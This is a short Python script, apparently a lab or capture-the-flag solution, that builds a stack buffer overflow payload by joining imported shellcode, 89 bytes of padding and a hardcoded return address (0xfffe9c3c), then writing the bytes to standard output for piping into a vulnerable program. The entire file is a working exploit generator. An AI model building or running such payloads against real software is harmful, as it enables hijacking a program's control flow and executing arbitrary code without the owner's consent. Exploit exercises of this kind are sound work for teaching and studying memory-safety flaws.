from shellcode import shellcode
from struct import pack 
import sys

vuln_str = 'l'*89 #112 chars until return address
vuln_bytes = bytes(vuln_str, 'utf-8')
return_address = pack("<I", 0xfffe9c3c)

# payload = vuln_bytes + return_address
payload = shellcode + vuln_bytes + return_address
sys.stdout.buffer.write(payload)
# sys.stdout.buffer.write(shellcode)